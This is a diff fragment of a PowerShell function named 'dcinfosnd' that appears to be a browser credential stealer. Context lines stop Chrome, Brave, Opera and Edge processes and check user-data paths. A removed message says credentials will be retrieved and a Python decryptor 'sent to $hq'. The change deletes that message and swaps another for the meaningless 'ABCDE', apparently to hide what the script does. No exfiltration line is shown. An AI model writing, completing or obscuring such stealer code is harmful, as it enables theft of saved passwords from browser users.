@@ -4,7 +4,7 @@ function dcinfosnd {
     )
     $ErrorActionPreference = 'SilentlyContinue'
     
-    Write-Host "Starting credential retrieval for Chrome, Brave, Opera and Edge - Python decryptor will be prepared and sent to $hq"
+    
     Write-Host "======================================================================================"
     
 
@@ -23,7 +23,7 @@ function dcinfosnd {
             
             Stop-Process -Name $browserName -ErrorAction SilentlyContinue
             
-            Write-Host "initiating require python libraries to install..."
+            Write-Host "ABCDE"
             
             
             if (-not (Test-Path $userDataPath)) {
